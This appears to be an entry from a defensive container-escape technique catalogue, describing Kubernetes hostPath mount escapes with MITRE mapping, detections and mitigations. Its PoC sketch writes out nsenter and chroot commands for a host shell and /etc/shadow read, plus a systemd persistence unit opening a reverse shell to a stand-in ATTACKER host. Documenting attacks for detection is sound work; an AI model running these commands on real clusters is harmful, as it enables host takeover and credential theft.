---
id: CE-007
name: Host path / volume mount escape
category: orchestration/volumes
mitre_attack: [T1611, T1005]
risk: high
detection_rules: [SIGMA-003, SIGMA-009, FALCO-003, FALCO-008]
---

# CE-007 — Host path / volume mount escape

## Summary

The workhorse of Kubernetes escapes. When a pod can mount host paths — `/`,
`/proc`, `/sys`, `/var/run`, `/.kube`, `/etc/kubernetes` — the host is one
`chroot`, `nsenter`, or config-write away. This is why PodSecurity Restricted
and admission controllers exist.

## Prerequisites

- Pod spec with `hostPath` (privileged policy or no admission control)
- Relevant capabilities (`CAP_SYS_ADMIN` for nsenter/chroot/mount)
- `hostPID: true` makes PID-based attacks direct

## Attack path

1. Mount host `/` → read `/etc/shadow`, write `/etc/cron.d/`, drop SSH keys
2. Mount host `/proc` + `hostPID` → `nsenter -t 1 -a` for a full host shell
3. Mount `/.kube` or `/etc/kubernetes` → steal admin kubeconfigs
4. Mount `/var/run` → runtime socket abuse (CE-004)

## PoC sketch

```bash
# full host shell via /proc mount + nsenter (hostPID pod)
nsenter --target 1 --mount --uts --ipc --net --pid -- bash -l

# chroot into mounted host root
chroot /host /bin/sh -c 'id; cat /etc/shadow'

# persistence: systemd unit into mounted host /etc
cat > /host/etc/systemd/system/pwn.service <<'EOF'
[Unit]
Description=pwn
[Service]
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"
[Install]
WantedBy=multi-user.target
EOF
```

## Detection

- **Admission:** `admission-review` flags hostPath `/proc`, `/sys`, `/`,
  `/.kube`, runtime sockets (builtin checks) — this corpus's tool
- **Logs:** kubelet audit — hostPath volume in pod spec; runtime mount events
- **Sigma:** `SIGMA-003` (nsenter), `SIGMA-009` (chroot)
- **Falco:** `FALCO-003` (nsenter spawn), `FALCO-008` (sensitive mounts)

## Mitigation

- PodSecurity Standards `restricted`; deny `hostPath` in admission policy
- `hostPID`/`hostIPC`/`hostNetwork` default-deny
- Keep node credentials out of default service accounts
- RuntimeClass with gVisor/Kata for anything that must run privileged-ish

## References

- Kubernetes hostPath volume docs
- MITRE ATT&CK T1611, T1005 (Data from Local System)
